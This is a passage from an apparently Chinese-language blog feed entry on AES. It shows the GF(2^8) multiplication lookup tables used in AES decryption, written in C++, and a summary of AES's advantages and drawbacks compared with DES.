class="number">0xc2</span>,<span class="number">0xcb</span>,<span class="number">0xd0</span>,<span class="number">0xd9</span>,<span class="number">0xae</span>,<span class="number">0xa7</span>,<span class="number">0xbc</span>,<span class="number">0xb5</span>,<span class="number">0x8a</span>,<span class="number">0x83</span>,<span class="number">0x98</span>,<span class="number">0x91</span>,</span><br><span class="line"><span class="number">0x4d</span>,<span class="number">0x44</span>,<span class="number">0x5f</span>,<span class="number">0x56</span>,<span class="number">0x69</span>,<span class="number">0x60</span>,<span class="number">0x7b</span>,<span class="number">0x72</span>,<span class="number">0x05</span>,<span class="number">0x0c</span>,<span class="number">0x17</span>,<span class="number">0x1e</span>,<span class="number">0x21</span>,<span class="number">0x28</span>,<span class="number">0x33</span>,<span class="number">0x3a</span>,</span><br><span class="line"><span class="number">0xdd</span>,<span class="number">0xd4</span>,<span class="number">0xcf</span>,<span class="number">0xc6</span>,<span class="number">0xf9</span>,<span class="number">0xf0</span>,<span class="number">0xeb</span>,<span class="number">0xe2</span>,<span class="number">0x95</span>,<span class="number">0x9c</span>,<span class="number">0x87</span>,<span class="number">0x8e</span>,<span class="number">0xb1</span>,<span class="number">0xb8</span>,<span class="number">0xa3</span>,<span class="number">0xaa</span>,</span><br><span class="line"><span class="number">0xec</span>,<span class="number">0xe5</span>,<span class="number">0xfe</span>,<span class="number">0xf7</span>,<span class="number">0xc8</span>,<span class="number">0xc1</span>,<span class="number">0xda</span>,<span class="number">0xd3</span>,<span class="number">0xa4</span>,<span class="number">0xad</span>,<span class="number">0xb6</span>,<span class="number">0xbf</span>,<span class="number">0x80</span>,<span class="number">0x89</span>,<span class="number">0x92</span>,<span class="number">0x9b</span>,</span><br><span class="line"><span class="number">0x7c</span>,<span class="number">0x75</span>,<span class="number">0x6e</span>,<span class="number">0x67</span>,<span class="number">0x58</span>,<span class="number">0x51</span>,<span class="number">0x4a</span>,<span class="number">0x43</span>,<span class="number">0x34</span>,<span class="number">0x3d</span>,<span class="number">0x26</span>,<span class="number">0x2f</span>,<span class="number">0x10</span>,<span class="number">0x19</span>,<span class="number">0x02</span>,<span class="number">0x0b</span>,</span><br><span class="line"><span class="number">0xd7</span>,<span class="number">0xde</span>,<span class="number">0xc5</span>,<span class="number">0xcc</span>,<span class="number">0xf3</span>,<span class="number">0xfa</span>,<span class="number">0xe1</span>,<span class="number">0xe8</span>,<span class="number">0x9f</span>,<span class="number">0x96</span>,<span class="number">0x8d</span>,<span class="number">0x84</span>,<span class="number">0xbb</span>,<span class="number">0xb2</span>,<span class="number">0xa9</span>,<span class="number">0xa0</span>,</span><br><span class="line"><span class="number">0x47</span>,<span class="number">0x4e</span>,<span class="number">0x55</span>,<span class="number">0x5c</span>,<span class="number">0x63</span>,<span class="number">0x6a</span>,<span class="number">0x71</span>,<span class="number">0x78</span>,<span class="number">0x0f</span>,<span class="number">0x06</span>,<span class="number">0x1d</span>,<span class="number">0x14</span>,<span class="number">0x2b</span>,<span class="number">0x22</span>,<span class="number">0x39</span>,<span class="number">0x30</span>,</span><br><span class="line"><span class="number">0x9a</span>,<span class="number">0x93</span>,<span class="number">0x88</span>,<span class="number">0x81</span>,<span class="number">0xbe</span>,<span class="number">0xb7</span>,<span class="number">0xac</span>,<span class="number">0xa5</span>,<span class="number">0xd2</span>,<span class="number">0xdb</span>,<span class="number">0xc0</span>,<span class="number">0xc9</span>,<span class="number">0xf6</span>,<span class="number">0xff</span>,<span class="number">0xe4</span>,<span class="number">0xed</span>,</span><br><span class="line"><span class="number">0x0a</span>,<span class="number">0x03</span>,<span class="number">0x18</span>,<span class="number">0x11</span>,<span class="number">0x2e</span>,<span class="number">0x27</span>,<span class="number">0x3c</span>,<span class="number">0x35</span>,<span class="number">0x42</span>,<span class="number">0x4b</span>,<span class="number">0x50</span>,<span class="number">0x59</span>,<span class="number">0x66</span>,<span class="number">0x6f</span>,<span class="number">0x74</span>,<span class="number">0x7d</span>,</span><br><span class="line"><span class="number">0xa1</span>,<span class="number">0xa8</span>,<span class="number">0xb3</span>,<span class="number">0xba</span>,<span class="number">0x85</span>,<span class="number">0x8c</span>,<span class="number">0x97</span>,<span class="number">0x9e</span>,<span class="number">0xe9</span>,<span class="number">0xe0</span>,<span class="number">0xfb</span>,<span class="number">0xf2</span>,<span class="number">0xcd</span>,<span class="number">0xc4</span>,<span class="number">0xdf</span>,<span class="number">0xd6</span>,</span><br><span class="line"><span class="number">0x31</span>,<span class="number">0x38</span>,<span class="number">0x23</span>,<span class="number">0x2a</span>,<span class="number">0x15</span>,<span class="number">0x1c</span>,<span class="number">0x07</span>,<span class="number">0x0e</span>,<span class="number">0x79</span>,<span class="number">0x70</span>,<span class="number">0x6b</span>,<span class="number">0x62</span>,<span class="number">0x5d</span>,<span class="number">0x54</span>,<span class="number">0x4f</span>,<span class="number">0x46</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">byte Mul_0b[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="number">0x00</span>,<span class="number">0x0b</span>,<span class="number">0x16</span>,<span class="number">0x1d</span>,<span class="number">0x2c</span>,<span class="number">0x27</span>,<span class="number">0x3a</span>,<span class="number">0x31</span>,<span class="number">0x58</span>,<span class="number">0x53</span>,<span class="number">0x4e</span>,<span class="number">0x45</span>,<span class="number">0x74</span>,<span class="number">0x7f</span>,<span class="number">0x62</span>,<span class="number">0x69</span>,</span><br><span class="line"><span class="number">0xb0</span>,<span class="number">0xbb</span>,<span class="number">0xa6</span>,<span class="number">0xad</span>,<span class="number">0x9c</span>,<span class="number">0x97</span>,<span class="number">0x8a</span>,<span class="number">0x81</span>,<span class="number">0xe8</span>,<span class="number">0xe3</span>,<span class="number">0xfe</span>,<span class="number">0xf5</span>,<span class="number">0xc4</span>,<span class="number">0xcf</span>,<span class="number">0xd2</span>,<span class="number">0xd9</span>,</span><br><span class="line"><span class="number">0x7b</span>,<span class="number">0x70</span>,<span class="number">0x6d</span>,<span class="number">0x66</span>,<span class="number">0x57</span>,<span class="number">0x5c</span>,<span class="number">0x41</span>,<span class="number">0x4a</span>,<span class="number">0x23</span>,<span class="number">0x28</span>,<span class="number">0x35</span>,<span class="number">0x3e</span>,<span class="number">0x0f</span>,<span class="number">0x04</span>,<span class="number">0x19</span>,<span class="number">0x12</span>,</span><br><span class="line"><span class="number">0xcb</span>,<span class="number">0xc0</span>,<span class="number">0xdd</span>,<span class="number">0xd6</span>,<span class="number">0xe7</span>,<span class="number">0xec</span>,<span class="number">0xf1</span>,<span class="number">0xfa</span>,<span class="number">0x93</span>,<span class="number">0x98</span>,<span class="number">0x85</span>,<span class="number">0x8e</span>,<span class="number">0xbf</span>,<span class="number">0xb4</span>,<span class="number">0xa9</span>,<span class="number">0xa2</span>,</span><br><span class="line"><span class="number">0xf6</span>,<span class="number">0xfd</span>,<span class="number">0xe0</span>,<span class="number">0xeb</span>,<span class="number">0xda</span>,<span class="number">0xd1</span>,<span class="number">0xcc</span>,<span class="number">0xc7</span>,<span class="number">0xae</span>,<span class="number">0xa5</span>,<span class="number">0xb8</span>,<span class="number">0xb3</span>,<span class="number">0x82</span>,<span class="number">0x89</span>,<span class="number">0x94</span>,<span class="number">0x9f</span>,</span><br><span class="line"><span class="number">0x46</span>,<span class="number">0x4d</span>,<span class="number">0x50</span>,<span class="number">0x5b</span>,<span class="number">0x6a</span>,<span class="number">0x61</span>,<span class="number">0x7c</span>,<span class="number">0x77</span>,<span class="number">0x1e</span>,<span class="number">0x15</span>,<span class="number">0x08</span>,<span class="number">0x03</span>,<span class="number">0x32</span>,<span class="number">0x39</span>,<span class="number">0x24</span>,<span class="number">0x2f</span>,</span><br><span class="line"><span class="number">0x8d</span>,<span class="number">0x86</span>,<span class="number">0x9b</span>,<span class="number">0x90</span>,<span class="number">0xa1</span>,<span class="number">0xaa</span>,<span class="number">0xb7</span>,<span class="number">0xbc</span>,<span class="number">0xd5</span>,<span class="number">0xde</span>,<span class="number">0xc3</span>,<span class="number">0xc8</span>,<span class="number">0xf9</span>,<span class="number">0xf2</span>,<span class="number">0xef</span>,<span class="number">0xe4</span>,</span><br><span class="line"><span class="number">0x3d</span>,<span class="number">0x36</span>,<span class="number">0x2b</span>,<span class="number">0x20</span>,<span class="number">0x11</span>,<span class="number">0x1a</span>,<span class="number">0x07</span>,<span class="number">0x0c</span>,<span class="number">0x65</span>,<span class="number">0x6e</span>,<span class="number">0x73</span>,<span class="number">0x78</span>,<span class="number">0x49</span>,<span class="number">0x42</span>,<span class="number">0x5f</span>,<span class="number">0x54</span>,</span><br><span class="line"><span class="number">0xf7</span>,<span class="number">0xfc</span>,<span class="number">0xe1</span>,<span class="number">0xea</span>,<span class="number">0xdb</span>,<span class="number">0xd0</span>,<span class="number">0xcd</span>,<span class="number">0xc6</span>,<span class="number">0xaf</span>,<span class="number">0xa4</span>,<span class="number">0xb9</span>,<span class="number">0xb2</span>,<span class="number">0x83</span>,<span class="number">0x88</span>,<span class="number">0x95</span>,<span class="number">0x9e</span>,</span><br><span class="line"><span class="number">0x47</span>,<span class="number">0x4c</span>,<span class="number">0x51</span>,<span class="number">0x5a</span>,<span class="number">0x6b</span>,<span class="number">0x60</span>,<span class="number">0x7d</span>,<span class="number">0x76</span>,<span class="number">0x1f</span>,<span class="number">0x14</span>,<span class="number">0x09</span>,<span class="number">0x02</span>,<span class="number">0x33</span>,<span class="number">0x38</span>,<span class="number">0x25</span>,<span class="number">0x2e</span>,</span><br><span class="line"><span class="number">0x8c</span>,<span class="number">0x87</span>,<span class="number">0x9a</span>,<span class="number">0x91</span>,<span class="number">0xa0</span>,<span class="number">0xab</span>,<span class="number">0xb6</span>,<span class="number">0xbd</span>,<span class="number">0xd4</span>,<span class="number">0xdf</span>,<span class="number">0xc2</span>,<span class="number">0xc9</span>,<span class="number">0xf8</span>,<span class="number">0xf3</span>,<span class="number">0xee</span>,<span class="number">0xe5</span>,</span><br><span class="line"><span class="number">0x3c</span>,<span class="number">0x37</span>,<span class="number">0x2a</span>,<span class="number">0x21</span>,<span class="number">0x10</span>,<span class="number">0x1b</span>,<span class="number">0x06</span>,<span class="number">0x0d</span>,<span class="number">0x64</span>,<span class="number">0x6f</span>,<span class="number">0x72</span>,<span class="number">0x79</span>,<span class="number">0x48</span>,<span class="number">0x43</span>,<span class="number">0x5e</span>,<span class="number">0x55</span>,</span><br><span class="line"><span class="number">0x01</span>,<span class="number">0x0a</span>,<span class="number">0x17</span>,<span class="number">0x1c</span>,<span class="number">0x2d</span>,<span class="number">0x26</span>,<span class="number">0x3b</span>,<span class="number">0x30</span>,<span class="number">0x59</span>,<span class="number">0x52</span>,<span class="number">0x4f</span>,<span class="number">0x44</span>,<span class="number">0x75</span>,<span class="number">0x7e</span>,<span class="number">0x63</span>,<span class="number">0x68</span>,</span><br><span class="line"><span class="number">0xb1</span>,<span class="number">0xba</span>,<span class="number">0xa7</span>,<span class="number">0xac</span>,<span class="number">0x9d</span>,<span class="number">0x96</span>,<span class="number">0x8b</span>,<span class="number">0x80</span>,<span class="number">0xe9</span>,<span class="number">0xe2</span>,<span class="number">0xff</span>,<span class="number">0xf4</span>,<span class="number">0xc5</span>,<span class="number">0xce</span>,<span class="number">0xd3</span>,<span class="number">0xd8</span>,</span><br><span class="line"><span class="number">0x7a</span>,<span class="number">0x71</span>,<span class="number">0x6c</span>,<span class="number">0x67</span>,<span class="number">0x56</span>,<span class="number">0x5d</span>,<span class="number">0x40</span>,<span class="number">0x4b</span>,<span class="number">0x22</span>,<span class="number">0x29</span>,<span class="number">0x34</span>,<span class="number">0x3f</span>,<span class="number">0x0e</span>,<span class="number">0x05</span>,<span class="number">0x18</span>,<span class="number">0x13</span>,</span><br><span class="line"><span class="number">0xca</span>,<span class="number">0xc1</span>,<span class="number">0xdc</span>,<span class="number">0xd7</span>,<span class="number">0xe6</span>,<span class="number">0xed</span>,<span class="number">0xf0</span>,<span class="number">0xfb</span>,<span class="number">0x92</span>,<span class="number">0x99</span>,<span class="number">0x84</span>,<span class="number">0x8f</span>,<span class="number">0xbe</span>,<span class="number">0xb5</span>,<span class="number">0xa8</span>,<span class="number">0xa3</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">byte Mul_0d[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="number">0x00</span>,<span class="number">0x0d</span>,<span class="number">0x1a</span>,<span class="number">0x17</span>,<span class="number">0x34</span>,<span class="number">0x39</span>,<span class="number">0x2e</span>,<span class="number">0x23</span>,<span class="number">0x68</span>,<span class="number">0x65</span>,<span class="number">0x72</span>,<span class="number">0x7f</span>,<span class="number">0x5c</span>,<span class="number">0x51</span>,<span class="number">0x46</span>,<span class="number">0x4b</span>,</span><br><span class="line"><span class="number">0xd0</span>,<span class="number">0xdd</span>,<span class="number">0xca</span>,<span class="number">0xc7</span>,<span class="number">0xe4</span>,<span class="number">0xe9</span>,<span class="number">0xfe</span>,<span class="number">0xf3</span>,<span class="number">0xb8</span>,<span class="number">0xb5</span>,<span class="number">0xa2</span>,<span class="number">0xaf</span>,<span class="number">0x8c</span>,<span class="number">0x81</span>,<span class="number">0x96</span>,<span class="number">0x9b</span>,</span><br><span class="line"><span class="number">0xbb</span>,<span class="number">0xb6</span>,<span class="number">0xa1</span>,<span class="number">0xac</span>,<span class="number">0x8f</span>,<span class="number">0x82</span>,<span class="number">0x95</span>,<span class="number">0x98</span>,<span class="number">0xd3</span>,<span class="number">0xde</span>,<span class="number">0xc9</span>,<span class="number">0xc4</span>,<span class="number">0xe7</span>,<span class="number">0xea</span>,<span class="number">0xfd</span>,<span class="number">0xf0</span>,</span><br><span class="line"><span class="number">0x6b</span>,<span class="number">0x66</span>,<span class="number">0x71</span>,<span class="number">0x7c</span>,<span class="number">0x5f</span>,<span class="number">0x52</span>,<span class="number">0x45</span>,<span class="number">0x48</span>,<span class="number">0x03</span>,<span class="number">0x0e</span>,<span class="number">0x19</span>,<span class="number">0x14</span>,<span class="number">0x37</span>,<span class="number">0x3a</span>,<span class="number">0x2d</span>,<span class="number">0x20</span>,</span><br><span class="line"><span class="number">0x6d</span>,<span class="number">0x60</span>,<span class="number">0x77</span>,<span class="number">0x7a</span>,<span class="number">0x59</span>,<span class="number">0x54</span>,<span class="number">0x43</span>,<span class="number">0x4e</span>,<span class="number">0x05</span>,<span class="number">0x08</span>,<span class="number">0x1f</span>,<span class="number">0x12</span>,<span class="number">0x31</span>,<span class="number">0x3c</span>,<span class="number">0x2b</span>,<span class="number">0x26</span>,</span><br><span class="line"><span class="number">0xbd</span>,<span class="number">0xb0</span>,<span class="number">0xa7</span>,<span class="number">0xaa</span>,<span class="number">0x89</span>,<span class="number">0x84</span>,<span class="number">0x93</span>,<span class="number">0x9e</span>,<span class="number">0xd5</span>,<span class="number">0xd8</span>,<span class="number">0xcf</span>,<span class="number">0xc2</span>,<span class="number">0xe1</span>,<span class="number">0xec</span>,<span class="number">0xfb</span>,<span class="number">0xf6</span>,</span><br><span class="line"><span class="number">0xd6</span>,<span class="number">0xdb</span>,<span class="number">0xcc</span>,<span class="number">0xc1</span>,<span class="number">0xe2</span>,<span class="number">0xef</span>,<span class="number">0xf8</span>,<span class="number">0xf5</span>,<span class="number">0xbe</span>,<span class="number">0xb3</span>,<span class="number">0xa4</span>,<span class="number">0xa9</span>,<span class="number">0x8a</span>,<span class="number">0x87</span>,<span class="number">0x90</span>,<span class="number">0x9d</span>,</span><br><span class="line"><span class="number">0x06</span>,<span class="number">0x0b</span>,<span class="number">0x1c</span>,<span class="number">0x11</span>,<span class="number">0x32</span>,<span class="number">0x3f</span>,<span class="number">0x28</span>,<span class="number">0x25</span>,<span class="number">0x6e</span>,<span class="number">0x63</span>,<span class="number">0x74</span>,<span class="number">0x79</span>,<span class="number">0x5a</span>,<span class="number">0x57</span>,<span class="number">0x40</span>,<span class="number">0x4d</span>,</span><br><span class="line"><span class="number">0xda</span>,<span class="number">0xd7</span>,<span class="number">0xc0</span>,<span class="number">0xcd</span>,<span class="number">0xee</span>,<span class="number">0xe3</span>,<span class="number">0xf4</span>,<span class="number">0xf9</span>,<span class="number">0xb2</span>,<span class="number">0xbf</span>,<span class="number">0xa8</span>,<span class="number">0xa5</span>,<span class="number">0x86</span>,<span class="number">0x8b</span>,<span class="number">0x9c</span>,<span class="number">0x91</span>,</span><br><span class="line"><span class="number">0x0a</span>,<span class="number">0x07</span>,<span class="number">0x10</span>,<span class="number">0x1d</span>,<span class="number">0x3e</span>,<span class="number">0x33</span>,<span class="number">0x24</span>,<span class="number">0x29</span>,<span class="number">0x62</span>,<span class="number">0x6f</span>,<span class="number">0x78</span>,<span class="number">0x75</span>,<span class="number">0x56</span>,<span class="number">0x5b</span>,<span class="number">0x4c</span>,<span class="number">0x41</span>,</span><br><span class="line"><span class="number">0x61</span>,<span class="number">0x6c</span>,<span class="number">0x7b</span>,<span class="number">0x76</span>,<span class="number">0x55</span>,<span class="number">0x58</span>,<span class="number">0x4f</span>,<span class="number">0x42</span>,<span class="number">0x09</span>,<span class="number">0x04</span>,<span class="number">0x13</span>,<span class="number">0x1e</span>,<span class="number">0x3d</span>,<span class="number">0x30</span>,<span class="number">0x27</span>,<span class="number">0x2a</span>,</span><br><span class="line"><span class="number">0xb1</span>,<span class="number">0xbc</span>,<span class="number">0xab</span>,<span class="number">0xa6</span>,<span class="number">0x85</span>,<span class="number">0x88</span>,<span class="number">0x9f</span>,<span class="number">0x92</span>,<span class="number">0xd9</span>,<span class="number">0xd4</span>,<span class="number">0xc3</span>,<span class="number">0xce</span>,<span class="number">0xed</span>,<span class="number">0xe0</span>,<span class="number">0xf7</span>,<span class="number">0xfa</span>,</span><br><span class="line"><span class="number">0xb7</span>,<span class="number">0xba</span>,<span class="number">0xad</span>,<span class="number">0xa0</span>,<span class="number">0x83</span>,<span class="number">0x8e</span>,<span class="number">0x99</span>,<span class="number">0x94</span>,<span class="number">0xdf</span>,<span class="number">0xd2</span>,<span class="number">0xc5</span>,<span class="number">0xc8</span>,<span class="number">0xeb</span>,<span class="number">0xe6</span>,<span class="number">0xf1</span>,<span class="number">0xfc</span>,</span><br><span class="line"><span class="number">0x67</span>,<span class="number">0x6a</span>,<span class="number">0x7d</span>,<span class="number">0x70</span>,<span class="number">0x53</span>,<span class="number">0x5e</span>,<span class="number">0x49</span>,<span class="number">0x44</span>,<span class="number">0x0f</span>,<span class="number">0x02</span>,<span class="number">0x15</span>,<span class="number">0x18</span>,<span class="number">0x3b</span>,<span class="number">0x36</span>,<span class="number">0x21</span>,<span class="number">0x2c</span>,</span><br><span class="line"><span class="number">0x0c</span>,<span class="number">0x01</span>,<span class="number">0x16</span>,<span class="number">0x1b</span>,<span class="number">0x38</span>,<span class="number">0x35</span>,<span class="number">0x22</span>,<span class="number">0x2f</span>,<span class="number">0x64</span>,<span class="number">0x69</span>,<span class="number">0x7e</span>,<span class="number">0x73</span>,<span class="number">0x50</span>,<span class="number">0x5d</span>,<span class="number">0x4a</span>,<span class="number">0x47</span>,</span><br><span class="line"><span class="number">0xdc</span>,<span class="number">0xd1</span>,<span class="number">0xc6</span>,<span class="number">0xcb</span>,<span class="number">0xe8</span>,<span class="number">0xe5</span>,<span class="number">0xf2</span>,<span class="number">0xff</span>,<span class="number">0xb4</span>,<span class="number">0xb9</span>,<span class="number">0xae</span>,<span class="number">0xa3</span>,<span class="number">0x80</span>,<span class="number">0x8d</span>,<span class="number">0x9a</span>,<span class="number">0x97</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">byte Mul_0e[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="number">0x00</span>,<span class="number">0x0e</span>,<span class="number">0x1c</span>,<span class="number">0x12</span>,<span class="number">0x38</span>,<span class="number">0x36</span>,<span class="number">0x24</span>,<span class="number">0x2a</span>,<span class="number">0x70</span>,<span class="number">0x7e</span>,<span class="number">0x6c</span>,<span class="number">0x62</span>,<span class="number">0x48</span>,<span class="number">0x46</span>,<span class="number">0x54</span>,<span class="number">0x5a</span>,</span><br><span class="line"><span class="number">0xe0</span>,<span class="number">0xee</span>,<span class="number">0xfc</span>,<span class="number">0xf2</span>,<span class="number">0xd8</span>,<span class="number">0xd6</span>,<span class="number">0xc4</span>,<span class="number">0xca</span>,<span class="number">0x90</span>,<span class="number">0x9e</span>,<span class="number">0x8c</span>,<span class="number">0x82</span>,<span class="number">0xa8</span>,<span class="number">0xa6</span>,<span class="number">0xb4</span>,<span class="number">0xba</span>,</span><br><span class="line"><span class="number">0xdb</span>,<span class="number">0xd5</span>,<span class="number">0xc7</span>,<span class="number">0xc9</span>,<span class="number">0xe3</span>,<span class="number">0xed</span>,<span class="number">0xff</span>,<span class="number">0xf1</span>,<span class="number">0xab</span>,<span class="number">0xa5</span>,<span class="number">0xb7</span>,<span class="number">0xb9</span>,<span class="number">0x93</span>,<span class="number">0x9d</span>,<span class="number">0x8f</span>,<span class="number">0x81</span>,</span><br><span class="line"><span class="number">0x3b</span>,<span class="number">0x35</span>,<span class="number">0x27</span>,<span class="number">0x29</span>,<span class="number">0x03</span>,<span class="number">0x0d</span>,<span class="number">0x1f</span>,<span class="number">0x11</span>,<span class="number">0x4b</span>,<span class="number">0x45</span>,<span class="number">0x57</span>,<span class="number">0x59</span>,<span class="number">0x73</span>,<span class="number">0x7d</span>,<span class="number">0x6f</span>,<span class="number">0x61</span>,</span><br><span class="line"><span class="number">0xad</span>,<span class="number">0xa3</span>,<span class="number">0xb1</span>,<span class="number">0xbf</span>,<span class="number">0x95</span>,<span class="number">0x9b</span>,<span class="number">0x89</span>,<span class="number">0x87</span>,<span class="number">0xdd</span>,<span class="number">0xd3</span>,<span class="number">0xc1</span>,<span class="number">0xcf</span>,<span class="number">0xe5</span>,<span class="number">0xeb</span>,<span class="number">0xf9</span>,<span class="number">0xf7</span>,</span><br><span class="line"><span class="number">0x4d</span>,<span class="number">0x43</span>,<span class="number">0x51</span>,<span class="number">0x5f</span>,<span class="number">0x75</span>,<span class="number">0x7b</span>,<span class="number">0x69</span>,<span class="number">0x67</span>,<span class="number">0x3d</span>,<span class="number">0x33</span>,<span class="number">0x21</span>,<span class="number">0x2f</span>,<span class="number">0x05</span>,<span class="number">0x0b</span>,<span class="number">0x19</span>,<span class="number">0x17</span>,</span><br><span class="line"><span class="number">0x76</span>,<span class="number">0x78</span>,<span class="number">0x6a</span>,<span class="number">0x64</span>,<span class="number">0x4e</span>,<span class="number">0x40</span>,<span class="number">0x52</span>,<span class="number">0x5c</span>,<span class="number">0x06</span>,<span class="number">0x08</span>,<span class="number">0x1a</span>,<span class="number">0x14</span>,<span class="number">0x3e</span>,<span class="number">0x30</span>,<span class="number">0x22</span>,<span class="number">0x2c</span>,</span><br><span class="line"><span class="number">0x96</span>,<span class="number">0x98</span>,<span class="number">0x8a</span>,<span class="number">0x84</span>,<span class="number">0xae</span>,<span class="number">0xa0</span>,<span class="number">0xb2</span>,<span class="number">0xbc</span>,<span class="number">0xe6</span>,<span class="number">0xe8</span>,<span class="number">0xfa</span>,<span class="number">0xf4</span>,<span class="number">0xde</span>,<span class="number">0xd0</span>,<span class="number">0xc2</span>,<span class="number">0xcc</span>,</span><br><span class="line"><span class="number">0x41</span>,<span class="number">0x4f</span>,<span class="number">0x5d</span>,<span class="number">0x53</span>,<span class="number">0x79</span>,<span class="number">0x77</span>,<span class="number">0x65</span>,<span class="number">0x6b</span>,<span class="number">0x31</span>,<span class="number">0x3f</span>,<span class="number">0x2d</span>,<span class="number">0x23</span>,<span class="number">0x09</span>,<span class="number">0x07</span>,<span class="number">0x15</span>,<span class="number">0x1b</span>,</span><br><span class="line"><span class="number">0xa1</span>,<span class="number">0xaf</span>,<span class="number">0xbd</span>,<span class="number">0xb3</span>,<span class="number">0x99</span>,<span class="number">0x97</span>,<span class="number">0x85</span>,<span class="number">0x8b</span>,<span class="number">0xd1</span>,<span class="number">0xdf</span>,<span class="number">0xcd</span>,<span class="number">0xc3</span>,<span class="number">0xe9</span>,<span class="number">0xe7</span>,<span class="number">0xf5</span>,<span class="number">0xfb</span>,</span><br><span class="line"><span class="number">0x9a</span>,<span class="number">0x94</span>,<span class="number">0x86</span>,<span class="number">0x88</span>,<span class="number">0xa2</span>,<span class="number">0xac</span>,<span class="number">0xbe</span>,<span class="number">0xb0</span>,<span class="number">0xea</span>,<span class="number">0xe4</span>,<span class="number">0xf6</span>,<span class="number">0xf8</span>,<span class="number">0xd2</span>,<span class="number">0xdc</span>,<span class="number">0xce</span>,<span class="number">0xc0</span>,</span><br><span class="line"><span class="number">0x7a</span>,<span class="number">0x74</span>,<span class="number">0x66</span>,<span class="number">0x68</span>,<span class="number">0x42</span>,<span class="number">0x4c</span>,<span class="number">0x5e</span>,<span class="number">0x50</span>,<span class="number">0x0a</span>,<span class="number">0x04</span>,<span class="number">0x16</span>,<span class="number">0x18</span>,<span class="number">0x32</span>,<span class="number">0x3c</span>,<span class="number">0x2e</span>,<span class="number">0x20</span>,</span><br><span class="line"><span class="number">0xec</span>,<span class="number">0xe2</span>,<span class="number">0xf0</span>,<span class="number">0xfe</span>,<span class="number">0xd4</span>,<span class="number">0xda</span>,<span class="number">0xc8</span>,<span class="number">0xc6</span>,<span class="number">0x9c</span>,<span class="number">0x92</span>,<span class="number">0x80</span>,<span class="number">0x8e</span>,<span class="number">0xa4</span>,<span class="number">0xaa</span>,<span class="number">0xb8</span>,<span class="number">0xb6</span>,</span><br><span class="line"><span class="number">0x0c</span>,<span class="number">0x02</span>,<span class="number">0x10</span>,<span class="number">0x1e</span>,<span class="number">0x34</span>,<span class="number">0x3a</span>,<span class="number">0x28</span>,<span class="number">0x26</span>,<span class="number">0x7c</span>,<span class="number">0x72</span>,<span class="number">0x60</span>,<span class="number">0x6e</span>,<span class="number">0x44</span>,<span class="number">0x4a</span>,<span class="number">0x58</span>,<span class="number">0x56</span>,</span><br><span class="line"><span class="number">0x37</span>,<span class="number">0x39</span>,<span class="number">0x2b</span>,<span class="number">0x25</span>,<span class="number">0x0f</span>,<span class="number">0x01</span>,<span class="number">0x13</span>,<span class="number">0x1d</span>,<span class="number">0x47</span>,<span class="number">0x49</span>,<span class="number">0x5b</span>,<span class="number">0x55</span>,<span class="number">0x7f</span>,<span class="number">0x71</span>,<span class="number">0x63</span>,<span class="number">0x6d</span>,</span><br><span class="line"><span class="number">0xd7</span>,<span class="number">0xd9</span>,<span class="number">0xcb</span>,<span class="number">0xc5</span>,<span class="number">0xef</span>,<span class="number">0xe1</span>,<span class="number">0xf3</span>,<span class="number">0xfd</span>,<span class="number">0xa7</span>,<span class="number">0xa9</span>,<span class="number">0xbb</span>,<span class="number">0xb5</span>,<span class="number">0x9f</span>,<span class="number">0x91</span>,<span class="number">0x83</span>,<span class="number">0x8d</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><hr><h2 id="五、总结">五、总结</h2><h3 id="AES-的优势"><code>AES</code> 的优势</h3><ul><li><p>更高的安全性： <code>AES </code>提供了更高的安全性，因为它支持更长的密钥长度（128 比特、192 比特和 256 比特），这使得密码破解更加困难。相比之下，DES 使用 56 位密钥，相对容易受到暴力破解攻击。</p></li><li><p>更快的加密速度： <code>AES </code>的算法结构允许更高效的硬件和软件实现，因此它通常比 <code>DES </code>更快。这是由于其更简单的替代和置换结构，以及较长的密钥长度。</p></li><li><p>更好的密码学设计： <code>AES </code>的设计经过了广泛的密码学研究和审查，以确保其强大的安全性。相比之下，DES 已经过时，已经受到多种攻击的影响，包括差分攻击和线性攻击。</p></li><li><p>支持多种密钥长度： <code>AES </code>允许选择不同长度的密钥，以适应不同安全需求。这样，可以根据具体应用选择 128 位、192 位或 256 位密钥长度。</p></li><li><p>广泛采用： <code>AES </code>已经被广泛采用，被许多组织和国家用作数据加密的标准，包括美国政府。</p></li></ul><h3 id="AES-的缺点"><code>AES </code>的缺点</h3><ul><li><p>高硬件成本： 虽然 <code>AES </code>的算法结构更高效，但实现硬件版本仍然可能比 <code>DES </code>更昂贵。这可能会对资源有限的嵌入式系统造成一定负担。</p></li><li><p>不支持较长的块长度： <code>AES </code>只支持 <code>128 </code>位的块长度，而某些应用需要更长的块长度。这可能需要进行分组加密，增加了复杂性。</p></li></ul><p>总的来说，<code>AES </code>是一安全、高效且现代的对称加密算法，相对于 <code>DES </code>具有更多的优势。虽然它可能不是完美的，但它是当前广泛应用的加密标准之一，可满足多种安全需求。</p>]]></content>
    
    
    <summary type="html">AES密码学分析及C++实现AES加密解密</summary>
    
    
    
    <category term="密码学" scheme="https://nonevector.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
    <category term="AES" scheme="https://nonevector.top/tags/AES/"/>
    
  </entry>
  
  <entry>
    <title>组合数II</title>
    <link href="https://nonevector.top/posts/1.html"/>
    <id>https://nonevector.top/posts/1.html</id>
    <published>2023-10-14T07:52:58.851Z</published>
    <updated>2023-11-29T03:34:26.296Z</updated>
    
